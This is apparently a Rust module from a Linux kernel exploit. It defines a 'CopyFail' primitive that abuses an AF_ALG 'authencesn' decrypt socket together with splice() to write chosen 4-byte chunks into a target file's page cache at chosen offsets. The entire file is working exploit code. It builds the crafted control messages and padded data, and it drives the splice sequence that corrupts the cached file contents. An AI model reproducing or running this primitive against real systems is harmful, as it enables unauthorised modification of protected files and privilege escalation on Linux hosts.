use crate::alg::{AlgSocket, AAD_LEN, IV_LEN};
use crate::syscall::{close_fd, last};
use crate::Error;
use core::mem;
use core::ptr;

const ALG_SET_IV: i32 = 2;
const ALG_SET_OP: i32 = 3;
const ALG_SET_AEAD_ASSOCLEN: i32 = 4;
const SOL_ALG: i32 = 279;
const ALG_OP_DECRYPT: u32 = 0;

const CMSG_HDR_SIZE: usize = 16;
const fn cmsg_len(payload: usize) -> usize {
    CMSG_HDR_SIZE + payload
}
const fn cmsg_space(payload: usize) -> usize {
    (cmsg_len(payload) + 7) & !7
}

const OP_PAYLOAD: usize = 4;
const IV_PAYLOAD: usize = 4 + IV_LEN as usize;
const AAD_PAYLOAD: usize = 4;

const CMSG_OP_SPACE: usize = cmsg_space(OP_PAYLOAD);
const CMSG_IV_SPACE: usize = cmsg_space(IV_PAYLOAD);
const CMSG_AAD_SPACE: usize = cmsg_space(AAD_PAYLOAD);
pub const CMSG_TOTAL: usize = CMSG_OP_SPACE + CMSG_IV_SPACE + CMSG_AAD_SPACE;

const MAX_BUF: usize = 65536;
const MAX_SINK: usize = MAX_BUF + AAD_LEN as usize;

pub struct CopyFail {
    alg: AlgSocket,
    pipe_rd: i32,
    pipe_wr: i32,
}

impl CopyFail {
    pub fn new() -> Result<Self, Error> {
        let alg = AlgSocket::new_authencesn()?;
        let mut pipefd: [i32; 2] = [-1, -1];
        unsafe {
            if libc::pipe(pipefd.as_mut_ptr()) < 0 {
                return Err(last());
            }
        }
        Ok(CopyFail {
            alg,
            pipe_rd: pipefd[0],
            pipe_wr: pipefd[1],
        })
    }

    pub fn write_buffer(&mut self, target_fd: i32, buf: &[u8]) -> Result<(), Error> {
        self.write_buffer_at(target_fd, 0, buf)
    }

    /// Deposit `buf` into the target file's page cache starting at `base_offset`.
    /// `buf.len()` must be a multiple of 4. Each 4-byte chunk lands at file
    /// offset `base_offset + i*4`. `base_offset` need not be 4-aligned: the
    /// AF_ALG splice mechanism deposits at the byte boundary the splice length
    /// dictates. Empty buf is a no-op.
    pub fn write_buffer_at(
        &mut self,
        target_fd: i32,
        base_offset: usize,
        buf: &[u8],
    ) -> Result<(), Error> {
        if buf.is_empty() {
            return Ok(());
        }
        if !buf.len().is_multiple_of(4) {
            return Err(Error::InvalidArgument("buf.len() must be multiple of 4"));
        }
        if base_offset.saturating_add(buf.len()) > MAX_BUF {
            return Err(Error::InvalidArgument(
                "base_offset + buf.len() exceeds MAX_BUF",
            ));
        }

        let mut i: usize = 0;
        while i < buf.len() {
            let chunk = &buf[i..i + 4];
            let off = base_offset + i;
            self.deposit_chunk(target_fd, off, chunk)?;
            i += 4;
        }
        Ok(())
    }

    pub fn build_cmsg(out: &mut [u8; CMSG_TOTAL]) {
        out.fill(0);
        unsafe {
            // cmsg 1: ALG_SET_OP = ALG_OP_DECRYPT
            let p = out.as_mut_ptr();
            write_cmsg_hdr(p, OP_PAYLOAD, SOL_ALG, ALG_SET_OP);
            ptr::write_unaligned(p.add(CMSG_HDR_SIZE) as *mut u32, ALG_OP_DECRYPT);

            // cmsg 2: ALG_SET_IV — struct af_alg_iv { u32 ivlen; u8 iv[16] }
            let p2 = p.add(CMSG_OP_SPACE);
            write_cmsg_hdr(p2, IV_PAYLOAD, SOL_ALG, ALG_SET_IV);
            ptr::write_unaligned(p2.add(CMSG_HDR_SIZE) as *mut u32, IV_LEN);
            // iv bytes already zero from fill(0)

            // cmsg 3: ALG_SET_AEAD_ASSOCLEN = AAD_LEN (8)
            let p3 = p.add(CMSG_OP_SPACE + CMSG_IV_SPACE);
            write_cmsg_hdr(p3, AAD_PAYLOAD, SOL_ALG, ALG_SET_AEAD_ASSOCLEN);
            ptr::write_unaligned(p3.add(CMSG_HDR_SIZE) as *mut u32, AAD_LEN);
        }
    }

    pub fn build_data(chunk: &[u8], out: &mut [u8; 8]) {
        out[0] = b'A';
        out[1] = b'A';
        out[2] = b'A';
        out[3] = b'A';
        out[4] = chunk[0];
        out[5] = chunk[1];
        out[6] = chunk[2];
        out[7] = chunk[3];
    }

    fn deposit_chunk(&mut self, target_fd: i32, off: usize, chunk: &[u8]) -> Result<(), Error> {
        let mut cmsg_buf = [0u8; CMSG_TOTAL];
        Self::build_cmsg(&mut cmsg_buf);

        let mut data_buf = [0u8; 8];
        Self::build_data(chunk, &mut data_buf);

        let splice_len = off + 4;

        unsafe {
            let mut iov = libc::iovec {
                iov_base: data_buf.as_mut_ptr() as *mut _,
                iov_len: data_buf.len(),
            };
            let mut msg: libc::msghdr = mem::zeroed();
            msg.msg_iov = &mut iov;
            msg.msg_iovlen = 1;
            msg.msg_control = cmsg_buf.as_mut_ptr() as *mut _;
            msg.msg_controllen = cmsg_buf.len() as _;

            let sent = libc::sendmsg(self.alg.op_fd, &msg, libc::MSG_MORE);
            if sent < 0 {
                return Err(last());
            }

            let mut src_off: libc::loff_t = 0;
            let s1 = libc::splice(
                target_fd,
                &mut src_off,
                self.pipe_wr,
                ptr::null_mut(),
                splice_len,
                0,
            );
            if s1 < 0 {
                return Err(last());
            }

            let s2 = libc::splice(
                self.pipe_rd,
                ptr::null_mut(),
                self.alg.op_fd,
                ptr::null_mut(),
                splice_len,
                0,
            );
            if s2 < 0 {
                return Err(last());
            }

            let mut sink = [0u8; MAX_SINK];
            let want = (AAD_LEN as usize + off).min(sink.len());
            let _ = libc::recv(self.alg.op_fd, sink.as_mut_ptr() as *mut _, want, 0);
        }
        Ok(())
    }
}

impl Drop for CopyFail {
    fn drop(&mut self) {
        unsafe {
            close_fd(self.pipe_rd);
            close_fd(self.pipe_wr);
        }
    }
}

unsafe fn write_cmsg_hdr(p: *mut u8, payload: usize, level: i32, ty: i32) {
    // cmsghdr { size_t cmsg_len; int cmsg_level; int cmsg_type; }
    let len_val: usize = CMSG_HDR_SIZE + payload;
    ptr::write_unaligned(p as *mut usize, len_val);
    ptr::write_unaligned(p.add(8) as *mut i32, level);
    ptr::write_unaligned(p.add(12) as *mut i32, ty);
}
